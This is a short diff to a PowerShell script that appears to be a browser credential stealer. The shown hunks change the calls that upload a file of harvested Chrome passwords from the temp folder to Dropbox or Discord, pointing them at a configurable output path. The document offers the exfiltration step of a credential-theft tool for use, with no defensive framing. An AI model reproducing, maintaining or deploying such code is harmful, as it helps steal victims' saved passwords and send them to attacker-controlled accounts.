@@ -156,7 +156,7 @@ function DropBox-Upload {
 }
 
 if (-not ([string]::IsNullOrEmpty($db))) {
-	DropBox-Upload -f $env:TEMP/--chrome-pass.txt
+	DropBox-Upload -f $outputFilePath
 }
 
 ############################################################################################################################################################
@@ -188,7 +188,7 @@ function Upload-Discord {
 }
 
 if (-not ([string]::IsNullOrEmpty($dc))) {
-    Upload-Discord -file "$env:TEMP/--chrome-pass.txt"
+    Upload-Discord -file $outputFilePath
 }
 
 ############################################################################################################################################################
